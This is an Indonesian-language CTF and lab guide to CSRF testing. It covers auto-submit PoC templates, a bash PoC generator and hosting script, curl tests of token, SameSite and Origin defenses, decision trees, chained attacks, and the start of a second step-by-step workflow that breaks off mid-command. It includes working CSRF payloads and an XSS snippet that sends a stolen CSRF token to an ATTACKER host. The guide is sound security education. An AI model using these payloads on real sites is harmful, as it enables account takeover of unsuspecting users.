
```text
Ticket comment
     │
     ▼
Contains auto-submitting form
     │
     ▼
Admin opens ticket
     │
     ▼
Browser submits state-changing request
```

Impact dapat lebih tinggi bila victim:

```text
admin
moderator
finance user
```

---

# 🧪 3. CSRF PoC Generation

# 3.1 HTML PoC Templates

## POST Auto-Submit

```html
<!doctype html>
<html lang="en">
<body>

<form
    id="csrf"
    action="http://TARGET/change-email"
    method="POST">

    <input
        type="hidden"
        name="email"
        value="attacker@example.com">

</form>

<script>
document.getElementById("csrf").submit();
</script>

</body>
</html>
```

---

## GET Image

```html
<!doctype html>
<html lang="en">
<body>

<img
    src="http://TARGET/change-setting?enabled=true"
    alt="">

</body>
</html>
```

---

## Iframe Auto-Submit

```html
<!doctype html>
<html lang="en">
<body>

<iframe
    name="csrf-frame"
    style="display:none">
</iframe>

<form
    action="http://TARGET/change-email"
    method="POST"
    target="csrf-frame">

    <input
        type="hidden"
        name="email"
        value="attacker@example.com">

</form>

<script>
document.forms[0].submit();
</script>

</body>
</html>
```

Cookie/SameSite policy tetap berlaku.

---

## Fetch with Credentials

```html
<!doctype html>
<html lang="en">
<body>

<script>
fetch("http://TARGET/change-email", {
    method: "POST",
    credentials: "include",
    headers: {
        "Content-Type":
            "application/x-www-form-urlencoded"
    },
    body:
        "email=attacker%40example.com"
});
</script>

</body>
</html>
```

Cross-origin restrictions dapat menghalangi request tertentu sebelum request dikirim.

---

## Multi-Step CSRF

### Step 1

```html
<form
    id="step1"
    action="http://TARGET/start"
    method="POST">
</form>

<script>
document.getElementById("step1").submit();
</script>
```

### Step 2

```html
<form
    id="step2"
    action="http://TARGET/finish"
    method="POST">

    <input
        type="hidden"
        name="confirm"
        value="true">

</form>

<script>
setTimeout(function () {
    document.getElementById("step2").submit();
}, 3000); // 3 detik lebih reliable untuk memproses step 1 dan menunggu redirect
</script>
```

> Multi-step chain hanya akan bekerja jika masing-masing step dapat dilakukan tanpa secret/token baru yang tidak dapat diperoleh attacker page.

---

# 3.2 Burp Suite Generate CSRF PoC

## 📌 Kapan Digunakan

Saat Anda sudah memiliki request state-changing yang valid di Burp.

Workflow umum:

```text
Proxy
  │
  ▼
Capture request
  │
  ▼
HTTP history
  │
  ▼
Right click request
  │
  ▼
Generate CSRF PoC
```

Pada Burp versions yang menyediakan fungsi ini, gunakan menu:

```text
Right Click
→ Engagement tools
→ Generate CSRF PoC
```

UI dapat berubah antar versi.

---

## Step-by-Step

1. Capture request.
    

```text
POST /change-email
```

2. Send to Repeater untuk memastikan request valid.
    
3. Pastikan:
    

```text
method
action
parameters
```

benar.

4. Generate PoC.
    
5. Modify:
    

```text
email
form target
auto-submit behavior
```

6. Save:
    

```text
csrf.html
```

7. Host:
    

```bash
# Host the generated PoC
cd ~/csrf-lab
python3 -m http.server 8000
```

---

# 3.3 Script `csrf_poc_generator.sh`

## 📌 Kapan Digunakan

Saat ingin membuat form-CSRF PoC secara cepat untuk lab.

Input:

```text
URL
parameter name
parameter value
```

```bash
#!/usr/bin/env bash

set -euo pipefail

usage() {
    echo "Usage: $0 <target_url> <parameter> <value>"
    echo
    echo "Example:"
    echo "$0 'http://TARGET/change-email' email 'attacker@example.com'"
    exit 1
}

[[ $# -eq 3 ]] || usage

URL="$1"
PARAM="$2"
VALUE="$3"

if [[ ! "$URL" =~ ^https?:// ]]; then
    echo "[!] URL must start with http:// or https://"
    exit 1
fi

if [[ "$URL" =~ [[:space:]] ]]; then
    echo "[!] URL contains whitespace"
    exit 1
fi

if [[ ! "$PARAM" =~ ^[A-Za-z0-9_.-]+$ ]]; then
    echo "[!] Invalid parameter name"
    exit 1
fi

if [[ -z "$VALUE" ]]; then
    echo "[!] Value cannot be empty"
    exit 1
fi

if ! command -v python3 >/dev/null 2>&1; then
    echo "[!] python3 is required"
    exit 1
fi

OUTDIR="${HOME}/csrf-lab"
POC="${OUTDIR}/csrf.html"

mkdir -p "$OUTDIR"

python3 - "$URL" "$PARAM" "$VALUE" "$POC" <<'PY'
import html
import sys
from pathlib import Path
from urllib.parse import urlparse

url, param, value, output = sys.argv[1:]

parsed = urlparse(url)

if parsed.scheme not in {"http", "https"}:
    raise SystemExit("Invalid URL scheme")

document = f"""<!doctype html>
<html lang="en">
<head>
    <meta charset="utf-8">
    <title>CSRF Lab PoC</title>
</head>
<body>

<form
    id="csrf-form"
    action="{html.escape(url, quote=True)}"
    method="POST">

    <input
        type="hidden"
        name="{html.escape(param, quote=True)}"
        value="{html.escape(value, quote=True)}">

</form>

<script>
document.getElementById("csrf-form").submit();
</script>

</body>
</html>
"""

Path(output).write_text(document, encoding="utf-8")
print(f"[+] PoC written to: {output}")
PY

PORT=8000

if (( PORT < 1 || PORT > 65535 )); then
    echo "[!] Invalid port"
    exit 1
fi

echo
echo "[+] Target  : $URL"
echo "[+] Parameter: $PARAM"
echo "[+] Output   : $POC"
echo
echo "[*] Starting local HTTP server on port $PORT"
echo "[*] Open: http://127.0.0.1:$PORT/csrf.html"
echo
echo "[!] Use only against authorized CTF/lab targets."

cd "$OUTDIR"
python3 -m http.server "$PORT"
```

Jalankan:

```bash
# Make the script executable
chmod +x csrf_poc_generator.sh

# Generate and host the CSRF PoC
./csrf_poc_generator.sh \
  'http://TARGET/change-email' \
  email \
  'attacker@example.com'
```

Expected:

```text
[+] PoC written to: /home/user/csrf-lab/csrf.html

[*] Starting local HTTP server on port 8000
[*] Open: http://127.0.0.1:8000/csrf.html
```

---

# 🔐 4. Defense Mechanisms

# 4.1 CSRF Token Analysis

## 📌 Kapan Digunakan

Uji lima hal:

```text
1. Token ada?
2. Token divalidasi?
3. Token tied ke session?
4. Token unpredictable?
5. Token reusable?
```

---

## Token Tidak Ada

```text
POST /change-email

email=test@example.com
```

Test:

```bash
# Submit without any token
curl -i \
  -X POST \
  'http://TARGET/change-email' \
  -H 'Cookie: session=LAB_SESSION' \
  --data-urlencode 'email=attacker@example.com'
```

---

## Token Tidak Divalidasi

```text
Valid token
INVALID_TOKEN
NO TOKEN

all → same behavior
```

Indikasi:

```text
server menerima token
tetapi tidak benar-benar memvalidasinya
```

---

## Token Tidak Tied ke Session

```text
Account A → Token A
Account B → Token B

Use:
Session B + Token A
```

Jika diterima:

```text
token binding weakness
```

---

## Predictable Token

Contoh:

```text
100001
100002
100003
```

atau:

```text
timestamp
```

Token yang predictable lebih berisiko.

Tetapi:

```text
length alone
≠
predictability proof
```

---

## Reusable Token

Workflow:

```text
Token A
 │
 ▼
Request success
 │
 ▼
Request again
 │
 ▼
Token A accepted?
```

Secure token dapat dibuat:

```text
single-use
atau
short-lived
atau
session-bound
```

sesuai desain aplikasi.

---

# 4.2 SameSite Analysis

## 📌 Kapan Digunakan

Ambil `Set-Cookie`.

```bash
# Inspect response cookies
curl -i \
  'http://TARGET/login' |
  grep -i '^Set-Cookie:'
```

Contoh:

```text
Set-Cookie: session=abc;
Path=/;
Secure;
HttpOnly;
SameSite=Lax
```

---

## Analysis

```text
SameSite=Strict
→ strongest cookie-level restriction

SameSite=Lax
→ cross-site subrequests restricted
→ top-level safe navigation exception

SameSite=None
→ cross-site allowed
→ Secure required

Missing
→ browser default behavior applies
→ verify actual browser
```

---

# 4.3 Origin/Referer Check Analysis

## 📌 Kapan Digunakan

Saat tidak ada CSRF token atau token lemah, tetapi server masih memiliki header validation.

Check:

```http
Origin: https://target.example
Referer: https://target.example/profile
```

---

## Origin Test

```bash
# Send expected Origin
curl -i \
  -X POST \
  'http://TARGET/change-email' \
  -H 'Cookie: session=LAB_SESSION' \
  -H 'Origin: http://TARGET' \
  --data-urlencode 'email=test@example.com'
```

Test malicious origin:

```bash
# Send an untrusted Origin
curl -i \
  -X POST \
  'http://TARGET/change-email' \
  -H 'Cookie: session=LAB_SESSION' \
  -H 'Origin: http://attacker.example' \
  --data-urlencode 'email=test@example.com'
```

---

## Secure Behavior

```text
Origin trusted
   → accepted

Origin attacker
   → 403
```

---

# 🔗 5. Chained Attacks

# 5.1 CSRF + XSS

## 📌 Kapan Digunakan

Saat:

```text
SameSite/CSRF token
       │
       ▼
hard to reach externally
       │
       ▼
XSS exists on target
```

XSS dapat menjalankan request sebagai target origin:

```text
XSS
 │
 ▼
Same-origin JavaScript
 │
 ▼
CSRF token accessible?
 │
 ├── YES → read token
 │
 └── NO
      │
      ▼
  Send authenticated action
```

---

## XSS untuk Steal CSRF Token

Misalnya token berada di DOM:

```html
<input
    name="csrf"
    value="SECRET_TOKEN">
```

XSS dapat membaca DOM:

```html
<script>
const token =
    document.querySelector(
        'input[name="csrf"]'
    ).value;

fetch(
    'http://ATTACKER:8000/?t=' +
    encodeURIComponent(token)
);
</script>
```

---

## XSS untuk Trigger CSRF

```html
<script>
fetch('/change-email', {
    method: 'POST',
    headers: {
        'Content-Type':
            'application/x-www-form-urlencoded'
    },
    body:
        'email=attacker%40example.com'
});
</script>
```

Karena script berjalan pada target origin:

```text
XSS
 │
 ▼
Same-Origin
 │
 ▼
Authenticated Request
```

---

## Chain Flow

```text
XSS
 │
 ├── read DOM
 │
 ├── read CSRF token
 │
 └── send authenticated request
          │
          ▼
       State Change
```

---

# 5.2 CSRF + Stored XSS

## 📌 Kapan Digunakan

Saat XSS payload dapat disimpan dan victim/admin membuka halaman tersebut.

Flow:

```text
Attacker
   │
   ▼
Stored XSS
   │
   ▼
Admin opens page
   │
   ▼
JavaScript executes
   │
   ▼
Same-origin request
   │
   ▼
State change
```

Impact dapat meningkat karena:

```text
attacker
    │
    ▼
stored content
    │
    ▼
privileged victim
```

---

# 5.3 CSRF + CORS

## 📌 Kapan Digunakan

Saat CORS configuration terlalu permisif dan API menggunakan cookie authentication.

Bad conceptual policy:

```http
Access-Control-Allow-Origin: http://attacker.example
Access-Control-Allow-Credentials: true
```

Atau:

```text
reflect arbitrary Origin
+
credentials=true
```

---

## Important Relationship

```text
CSRF
  │
  └── send unwanted request

CORS
  │
  └── control whether JS can read response
```

Jadi:

```text
CORS blocked
      ≠
request never happened
```

Tetapi untuk **non-simple JSON requests**, CORS preflight can prevent the actual request unless server permits it.

---

## Chain

```text
Weak CORS
   │
   ▼
Attacker JS can read response
   │
   ▼
Credentials included
   │
   ▼
Sensitive API interaction
```

Cross-reference:

```text
CORS testing
→ API security workflow
```

---

# 5.4 CSRF + OAuth

## 📌 Kapan Digunakan

Saat login menggunakan OAuth/SSO dan flow tidak memiliki state binding yang benar.

Normal:

```text
User
 │
 ▼
OAuth authorize
 │
 ▼
Provider
 │
 ▼
callback?code=...
&state=RANDOM
 │
 ▼
Application
```

---

## Login CSRF

Potentially dangerous pattern:

```text
Attacker starts OAuth login
        │
        ▼
Obtains authorization response
        │
        ▼
Victim opens crafted callback
        │
        ▼
Victim account bound incorrectly
```

Defensive control utama:

```text
state
 +
session binding
```

---

# 🌳 6. Decision Tree

## CSRF Standalone Decision Tree

```text
STATE-CHANGING ENDPOINT FOUND
             │
             ▼
       Is user authenticated?
             │
        ┌────┴────┐
       NO         YES
       │           │
       ▼           ▼
   Not classic   How auth sent?
    cookie CSRF       │
                      ▼
                Browser cookie?
                      │
                 ┌────┴────┐
                YES        NO
                 │          │
                 ▼          ▼
             Candidate    Analyze
             CSRF        auth mechanism
                 │
                 ▼
          Can request be formed?
                 │
            ┌────┴────┐
           YES        NO
            │          │
            ▼          ▼
      Check defenses   JSON/custom
            │          header/API
            ▼
        CSRF Token?
            │
      ┌─────┴─────┐
     NO          YES
      │            │
      ▼            ▼
  Test PoC     Test validation
                   │
             ┌─────┴─────┐
            FAIL         PASS
             │             │
             ▼             ▼
        Candidate      Token binding?
             │             │
             │        ┌────┴─────┐
             │       NO         YES
             │        │           │
             │        ▼           ▼
             │   Cross-session   Secure-ish
             │      test
             │
             ▼
          SameSite?
             │
      ┌──────┼─────────┐
      ▼      ▼         ▼
   Strict   Lax       None
      │      │         │
      │      ├── GET?  └── cross-site cookie
      │      │
      │      └── top-level nav?
      │
      ▼
 Origin/Referer?
      │
   ┌──┴──┐
  YES    NO
   │      │
   ▼      ▼
Test    PoC
bypass   │
   │      ▼
   └──→ Validate State Change
```

---

## JSON Branch

```text
JSON API
   │
   ▼
Needs application/json?
   │
 ┌─┴──────────────┐
YES               NO
 │                 │
 ▼                 ▼
Preflight?      Form CSRF candidate
 │
 ▼
CORS allows?
 │
 ┌─┴─┐
NO   YES
│      │
▼      ▼
Actual  Request
request may       proceeds
not proceed         │
                    ▼
               Is response readable?
```

---

## Token Branch

```text
TOKEN EXISTS
     │
     ▼
Remove token
     │
 ┌───┴────┐
 │        │
works   blocked
 │        │
 ▼        ▼
No       Test invalid
validation     │
              ▼
          Still works?
              │
          ┌───┴───┐
         YES      NO
          │        │
          ▼        ▼
       Token     validation
       ignored   present
          │
          ▼
       Cross-session?
          │
      ┌───┴───┐
     YES      NO
      │        │
      ▼        ▼
token not    likely bound
session-bound
```

---

## SameSite Branch

```text
COOKIE
  │
  ▼
SameSite?
  │
 ├── Strict
 │     │
 │     └── cross-site cookie generally absent
 │
 ├── Lax
 │     │
 │     ├── cross-site POST → cookie usually absent
 │     └── top-level GET → possible cookie
 │
 ├── None
 │     │
 │     └── cross-site cookie allowed + Secure
 │
 └── Missing
       │
       ▼
   Browser default
       │
       ▼
Verify in actual browser
```

---

# 🛠️ 7. Common Errors & Troubleshooting

|Error|Sebab|Solusi|
|---|---|---|
|Request ditolak padahal token valid|Token tied ke session berbeda|Ambil token dari session yang sama|
|Token valid tetapi request gagal|Token expired|Ambil token baru|
|Token berubah setiap request|Per-request token|Replay exact request sequence|
|Token missing menghasilkan 403|Server-side validation aktif|CSRF candidate tidak valid lewat token removal|
|SameSite=Strict tidak bisa bypass|Browser tidak mengirim cookie cross-site|Cari same-site primitive atau chaining lain|
|SameSite=Lax POST gagal|Lax biasanya tidak mengirim cookie pada cross-site POST|Periksa apakah GET side effect tersedia|
|SameSite=Lax GET berhasil|State-changing action menggunakan GET|Catat improper HTTP method + CSRF impact|
|SameSite=None tetap tidak bekerja|`Secure`/browser/privacy restrictions|Verify HTTPS, cookie flags, browser policy|
|Missing SameSite tidak langsung vulnerable|Modern browser default behavior dapat membatasi|Cek actual cookie behavior di browser|
|CORS memblok response|Origin tidak diizinkan|Ingat: response-read blocked tidak otomatis berarti request tidak pernah terkirim|
|CORS preflight gagal|Custom header/JSON memicu OPTIONS|Inspect preflight response|
|Browser tidak auto-send cookie|SameSite/domain/path/third-party policy|Inspect Network → Cookie|
|curl berhasil tetapi browser gagal|curl tidak menerapkan browser cookie policy|Uji kembali melalui browser|
|Form PoC submit tetapi tidak ada state change|Cookie tidak terkirim|Check SameSite/domain/path|
|Multi-step request gagal|Step kedua membutuhkan nonce/token baru|Trace seluruh workflow di Burp|
|Token tersedia di HTML tetapi inaccessible|Different origin/context/CSP|Pastikan XSS/same-origin context|
|GET CSRF gagal|Endpoint hanya menerima POST|Gunakan request method yang benar|
|Referer removal gagal|Server memakai Origin/token juga|Test controls secara terpisah|
|Origin attacker diterima|Origin validation lemah|Cek apakah server benar-benar compare exact origin|
|Referer contains target string|Lenient substring validation|Test strict origin parsing|
|JSON `fetch()` gagal|CORS preflight denied|Determine whether content type can be sent as a simple request|
|`text/plain` trick gagal|Server memeriksa Content-Type dengan benar|Cari alternate state-changing endpoint|
|Login CSRF tidak persisten|Session rotation/binding aman|Analyze exact login/session sequence|
|Stored CSRF tidak trigger|Victim tidak membuka content|Pastikan lab trigger path benar|
|Iframe PoC gagal|Cookie/SameSite/frame policy|Check Network and iframe policy|
|`<img>` GET PoC tidak bekerja|Cookie absent atau endpoint blocks GET|Validate request manually first|
|CSRF PoC works only once|One-time token/session state|Capture exact sequence|
|State changed tetapi UI tidak update|Frontend cache/stale page|Re-fetch target state|
|`200 OK` tetapi action gagal|Application returns generic 200|Validate actual state via GET|
|POST request succeeds with arbitrary token|Token not validated|Confirm using multiple invalid values|
|Token same for all users|Potential global token|Cross-session test in lab|
|CORS allowed but CSRF still fails|SameSite blocks credential|CORS and cookie policy are separate controls|
|`Origin` missing in curl|curl does not emulate browser automatically|Add explicit `Origin`/`Referer` for header testing|
|Browser behavior differs by browser|Privacy/cookie policy differences|Reproduce in challenge browser and record evidence|

---

# 📏 8. Golden Rules

```text
1. CSRF ≠ XSS.
```

```text
2. State-changing request adalah target utama.
```

```text
3. GET seharusnya tidak melakukan destructive state change.
```

```text
4. Token ada ≠ token aman.
```

```text
5. Token harus divalidasi server-side.
```

```text
6. Token harus sulit ditebak dan terikat pada security context yang tepat.
```

```text
7. SameSite adalah defense browser-level, bukan satu-satunya defense application-level.
```

```text
8. CORS ≠ CSRF protection.
```

```text
9. curl success ≠ browser success.
```

```text
10. HTTP 200 ≠ state change berhasil.
```

```text
11. Selalu verifikasi state setelah PoC.
```

```text
12. Uji satu defense pada satu waktu.
```

```text
13. Bedakan same-origin dengan same-site.
```

```text
14. JSON request memiliki browser/CORS constraints yang berbeda dari form request.
```

```text
15. Severity ditentukan business impact, bukan label "CSRF".
```

---

# ✅ 9. Final Checklist

```text
[ ] State-changing endpoint ditemukan
[ ] Authentication mechanism diketahui
[ ] Cookie/session behavior dipahami
[ ] Request normal berhasil direplay
[ ] Side effect teridentifikasi
[ ] CSRF token ditemukan atau dipastikan tidak ada
[ ] Token validation diuji
[ ] Missing token diuji
[ ] Invalid token diuji
[ ] Cross-session token diuji
[ ] Token predictability dianalisis
[ ] Token reuse diuji
[ ] Token location dicatat
[ ] SameSite attribute diperiksa
[ ] Strict behavior diuji
[ ] Lax behavior diuji
[ ] None behavior diuji
[ ] Missing SameSite behavior diverifikasi di browser
[ ] Origin header diuji
[ ] Referer header diuji
[ ] GET state-changing endpoint dicari
[ ] POST form CSRF diuji
[ ] GET CSRF diuji
[ ] JSON behavior dianalisis
[ ] CORS preflight dianalisis jika relevan
[ ] Login CSRF diperiksa
[ ] Stored CSRF diperiksa
[ ] Multi-step request diperiksa
[ ] Method override diperiksa
[ ] Same-site subdomain trust dianalisis
[ ] XSS chaining potential diperiksa
[ ] OAuth state handling diperiksa
[ ] Browser reproduction berhasil
[ ] Actual state change diverifikasi
[ ] Evidence request/response disimpan
[ ] Severity berdasarkan impact
```

---

# 🔀 10. Cross-Workflow

## CSRF ↔ XSS

```text
XSS
 │
 ├── read CSRF token
 ├── make same-origin request
 └── bypass some browser-side barriers
```

Cross-reference:

```text
→ [File 20: XSS](/docs/xss)
```

---

## CSRF ↔ CORS

```text
CSRF
 │
 └── send unwanted request

CORS
 │
 └── control JS response access
```

Cross-reference:

```text
→ [File 33: CORS](/docs/cors)
```

---

## CSRF ↔ OAuth

```text
OAuth
 │
 ├── authorization code
 ├── state
 └── callback
       │
       ▼
Login CSRF / account binding
```

---

## CSRF ↔ JWT

Penting:

```text
JWT in Authorization header
        │
        ▼
Browser does not automatically
attach arbitrary Authorization header
        │
        ▼
Classic cookie CSRF model changes
```

Tetapi:

```text
JWT stored in cookie
```

maka:

```text
cookie auth
     │
     ▼
CSRF remains relevant
```

Jadi:

```text
JWT
≠
automatic CSRF immunity
```

Yang penting adalah:

```text
Where is credential stored?
How is it attached?
```

---

# 🧠 11. One-Line Muscle Memory

```text
CSRF = "Bisakah saya membuat browser korban mengirim state-changing request ke target dengan credential korban, tanpa defense yang benar-benar divalidasi server?"
```

Workflow super cepat:

```text
STATE CHANGE
    ↓
COOKIE AUTH?
    ↓
CSRF TOKEN?
    ↓
VALIDATED?
    ↓
SESSION-BOUND?
    ↓
SAMESITE?
    ↓
ORIGIN/REFERER?
    ↓
REQUEST TYPE?
    ↓
CAN I REPRODUCE FROM ATTACKER PAGE?
    ↓
VERIFY ACTUAL STATE CHANGE
```

---

# 🎯 Quick CTF Recipe

Misalnya ditemukan:

```http
POST /change-email HTTP/1.1
Host: TARGET
Cookie: session=LAB_SESSION
Content-Type: application/x-www-form-urlencoded

email=test@example.com
```

### 1. Replay

```bash
# Confirm the normal authenticated request
curl -i \
  -X POST \
  'http://TARGET/change-email' \
  -H 'Cookie: session=LAB_SESSION' \
  --data-urlencode 'email=test@example.com'
```

### 2. Check token

```text
Tidak ada csrf_token
```

### 3. Buat PoC

```html
<form
    action="http://TARGET/change-email"
    method="POST">

    <input
        type="hidden"
        name="email"
        value="attacker@example.com">

</form>

<script>
document.forms[0].submit();
</script>
```

### 4. Host

```bash
# Serve the CSRF PoC locally
cd ~/csrf-lab
python3 -m http.server 8000
```

### 5. Victim opens

```text
http://ATTACKER:8000/csrf.html
```

### 6. Verify

```text
GET /profile
      ↓
email = attacker@example.com
```

### 7. If it fails

Periksa urutan:

```text
Cookie?
   ↓
SameSite?
   ↓
Token?
   ↓
Origin/Referer?
   ↓
Request method?
   ↓
CORS/preflight?
   ↓
Multi-step?
```

---
# 29 — CSRF Complete Attack Workflow — Interactive Decision Guide

> **Cara baca dokumen ini:** Setiap langkah punya **OUTPUT BERHASIL** ✅ dan **OUTPUT GAGAL/BERBEDA** ❌. Ikuti panah sesuai output yang kamu dapat. Jangan skip langkah.
> 
> **Scope:** HackTheBox, TryHackMe, PortSwigger Academy, CTF dengan izin pengujian resmi.

---

## 🔧 PRE-FLIGHT: Setup Environment

Bash

```
# Jalankan INI DULU sebelum apapun
export TARGET="http://target.htb"
export SESSION="LAB_SESSION_COOKIE_VALUE"
export ATTACKER_EMAIL="attacker@evil.com"
export LHOST="10.10.14.5"

mkdir -p ~/csrf_lab/{poc,evidence,notes}
cd ~/csrf_lab

echo "[*] Target: $TARGET"
echo "[*] Session: $SESSION"
```

**Output yang diharapkan:**

text

```
[*] Target: http://target.htb
[*] Session: abc123xyz...
```

---

## ═══════════════════════════════════════

## FASE 0: ORIENTASI — TEMUKAN STATE-CHANGING ENDPOINTS

## ═══════════════════════════════════════

> **Tujuan:** CSRF hanya relevan pada endpoint yang mengubah state. Jangan buang waktu pada halaman read-only.

### Langkah 0.1 — Login dan Browse Normal (Capture di Burp)

Bash

```
# Setup Burp proxy, lalu browse aplikasi secara normal
# Cara manual tanpa Burp — cek cookies dari login response
curl -i -X POST "$TARGET/login" \
    -H 'Content-Type: application/x-www-form-urlencoded' \
    --data-urlencode 'username=wiener' \
    --data-urlencode 'password=peter' \
    -c ~/csrf_lab/cookies.txt

# Lihat cookie yang didapat
cat ~/csrf_lab/cookies.txt
```

**OUTPUT BERHASIL ✅ — Login sukses:**

http

```
HTTP/1.1 302 Found
Location: /my-account
Set-Cookie: session=abc123xyz; HttpOnly; SameSite=Lax
```

➡️ Catat nilai `session` cookie. Catat juga atribut cookie:

- `SameSite=Strict` → sangat restrictif
- `SameSite=Lax` → ada celah untuk GET top-level navigation
- `SameSite=None; Secure` → cross-site cookie allowed
- Tidak ada SameSite → tergantung browser default (Chrome 80+ default ke Lax)

**OUTPUT GAGAL ❌ — Login ditolak:**

http

```
HTTP/1.1 200 OK
Invalid username or password
```

➡️ Cek credentials. Coba credentials lain dari challenge/lab description.

---

### Langkah 0.2 — Identifikasi State-Changing Endpoints

Bash

```
# Method 1: Fuzzing endpoint umum
ffuf -u "$TARGET/FUZZ" \
    -w /usr/share/seclists/Discovery/Web-Content/common.txt \
    -mc 200,301,302,307,401,403 \
    -b "session=$SESSION" \
    -o ~/csrf_lab/notes/endpoints.txt

# Method 2: grep dari history Burp (jika punya export)
# Fokus pada method POST dan endpoint dengan nama state-changing
grep -iE "(change|update|delete|transfer|modify|reset|enable|disable|add|remove)" \
    ~/csrf_lab/notes/endpoints.txt 2>/dev/null

# Method 3: Manual browse dengan curl — cek profile/settings page
curl -s "$TARGET/my-account" \
    -H "Cookie: session=$SESSION" | grep -iE "(form|action|method)"
```

**OUTPUT BERHASIL ✅ — Menemukan form state-changing:**

HTML

```
<form method="POST" action="/my-account/change-email">
    <input name="email" type="email">
    <input type="hidden" name="csrf" value="SOME_TOKEN">
</form>
```

**Endpoint yang WAJIB diuji CSRF:**

|Endpoint|Action|CSRF Impact|
|---|---|---|
|`/change-email`|Ganti email|HIGH — account takeover via password reset|
|`/change-password`|Ganti password|CRITICAL|
|`/transfer`|Transfer dana|CRITICAL|
|`/delete-account`|Hapus akun|HIGH|
|`/admin/promote`|Naikan privilege|CRITICAL|
|`/settings`|Ubah setting|MEDIUM|
|`/profile`|Update profil|MEDIUM|

---

### Langkah 0.3 — Capture Request State-Changing

Bash

```
# Capture request normal ke endpoint yang mau diuji
curl -i -X POST "$TARGET/my-account/change-email" \
    -H "Cookie: session=$SESSION" \
    -H "Content-Type: application/x-www-form-urlencoded" \
    --data-urlencode "email=normal@test.com" \
    --data-urlencode "csrf=TOKEN_FROM_PAGE"
```

**OUTPUT BERHASIL ✅ — Request diterima:**

http

```
HTTP/1.1 302 Found
Location: /my-account
```

➡️ Catat semua parameter yang dikirim. Khususnya:

- Ada parameter bernama `csrf`, `_csrf`, `csrf_token`, `X-CSRF-Token`?
- Ada `Referer` atau `Origin` yang dicheck?

**Lanjut ke FASE 1 untuk analisis protection.**

---

## ═══════════════════════════════════════

## FASE 1: ANALISIS DEFENSE MECHANISM

## ═══════════════════════════════════════

> **Tujuan:** Pahami protection apa yang ada sebelum mencoba bypass. Uji SATU defense pada satu waktu.

### Langkah 1.1 — Cek CSRF Token

Bash

```
# Test 1: Kirim request TANPA token sama sekali
curl -i -X POST "$TARGET/my-account/change-email" \
    -H "Cookie: session=$SESSION" \
    -H "Content-Type: application/x-www-form-urlencoded" \
    --data-urlencode "email=test1@evil.com"

# Test 2: Kirim dengan token INVALID
curl -i -X POST "$TARGET/my-account/change-email" \
    -H "Cookie: session=$SESSION" \
    -H "Content-Type: application/x-www-form-urlencoded" \
    --data-urlencode "email=test2@evil.com" \
    --data-urlencode "csrf=INVALID_TOKEN_12345"

# Test 3: Kirim dengan token KOSONG
curl -i -X POST "$TARGET/my-account/change-email" \
    -H "Cookie: session=$SESSION" \
    -H "Content-Type: application/x-www-form-urlencoded" \
    --data-urlencode "email=test3@evil.com" \
    --data-urlencode "csrf="
```

**OUTPUT: Token Validation ABSENT ✅ (VULNERABLE — Teknik 2.1):**

http

```
HTTP/1.1 302 Found
Location: /my-account
# State berubah! Token tidak divalidasi
```

➡️ Tidak perlu token sama sekali. Langsung ke **FASE 2 PATH A — Basic CSRF POST**

**OUTPUT: Token Required ❌ (ada validation):**

http

```
HTTP/1.1 400 Bad Request
Invalid CSRF token
```

http

```
HTTP/1.1 403 Forbidden
```

➡️ Ada validasi. Lanjut ke **Langkah 1.2 — Test Token Binding**

---

### Langkah 1.2 — Test Token Binding ke Session

> Prasyarat: Punya DUA akun (attacker + victim, atau dua sesi berbeda)

Bash

```
# Ambil token dari AKUN ATTACKER (session A)
export SESSION_A="SESSION_ATTACKER"
export TOKEN_A=$(curl -s "$TARGET/my-account" \
    -H "Cookie: session=$SESSION_A" | \
    grep -oP '(?<=name="csrf" value=")[^"]+')

echo "[*] Token A (attacker): $TOKEN_A"

# Akun victim (session B)
export SESSION_B="SESSION_VICTIM"

# Cross-test: Gunakan Session B dengan Token A (dari attacker)
curl -i -X POST "$TARGET/my-account/change-email" \
    -H "Cookie: session=$SESSION_B" \
    -H "Content-Type: application/x-www-form-urlencoded" \
    --data-urlencode "email=attacker@evil.com" \
    --data-urlencode "csrf=$TOKEN_A"
```

**OUTPUT: Token Tidak Tied ke Session ✅ (VULNERABLE — Teknik 2.4):**

http

```
HTTP/1.1 302 Found
Location: /my-account
# Victim session menerima token dari attacker session!
```

➡️ Lanjut ke **FASE 2 PATH B — Token Not Tied to Session**

**OUTPUT: Token Tied ke Session ❌:**

http

```
HTTP/1.1 403 Forbidden
CSRF token does not match
```

➡️ Token benar-benar bound ke session. Lanjut **Langkah 1.3 — Cek SameSite**

---

### Langkah 1.3 — Analisis SameSite Cookie Attribute

Bash

```
# Cek Set-Cookie header dari response login
curl -i -X POST "$TARGET/login" \
    -H "Content-Type: application/x-www-form-urlencoded" \
    --data-urlencode "username=wiener" \
    --data-urlencode "password=peter" 2>/dev/null | grep -i "set-cookie"
```

**OUTPUT: SameSite=None ✅:**

http

```
Set-Cookie: session=abc123; SameSite=None; Secure; HttpOnly
```

➡️ Cross-site cookie allowed. Form CSRF bisa jalan.

**OUTPUT: SameSite=Lax ⚠️:**

http

```
Set-Cookie: session=abc123; SameSite=Lax; HttpOnly
```

➡️ Cross-site POST diblokir, tapi top-level GET navigation masih bisa.

- Cek apakah ada **state-changing GET endpoint** → Teknik 2.2
- Cek apakah ada **Chrome 2-menit grace period** (baru login < 2 menit) → Teknik 2.7
- Cek apakah ada **method override** (`?_method=POST`) → Teknik 2.6

**OUTPUT: SameSite=Strict ❌:**

http

```
Set-Cookie: session=abc123; SameSite=Strict; HttpOnly
```

➡️ Sangat restrictif. Cross-site apapun tidak bawa cookie.

- Cari **subdomain** yang sama-site tapi berbeda-origin (apakah ada XSS di subdomain?)
- Cari **same-site primitive** lain
- Kalau buntu → cek apakah ada **XSS** dulu → Teknik 5.1

**OUTPUT: Tidak ada SameSite attribute:**

http

```
Set-Cookie: session=abc123; HttpOnly; Secure
```

➡️ Browser Chrome 80+ default ke Lax behavior. Verifikasi di browser lab yang sebenarnya.

---

### Langkah 1.4 — Cek Origin/Referer Validation

Bash

```
# Test 1: Hapus Referer header sepenuhnya
curl -i -X POST "$TARGET/my-account/change-email" \
    -H "Cookie: session=$SESSION" \
    -H "Content-Type: application/x-www-form-urlencoded" \
    -H "Referer: " \
    --data-urlencode "email=test@evil.com"

# Test 2: Kirim Referer yang valid (target domain)
curl -i -X POST "$TARGET/my-account/change-email" \
    -H "Cookie: session=$SESSION" \
    -H "Content-Type: application/x-www-form-urlencoded" \
    -H "Referer: $TARGET/my-account" \
    --data-urlencode "email=test@evil.com"

# Test 3: Kirim Referer attacker domain
curl -i -X POST "$TARGET/my-account/change-email" \
    -H "Cookie: session=$SESSION" \
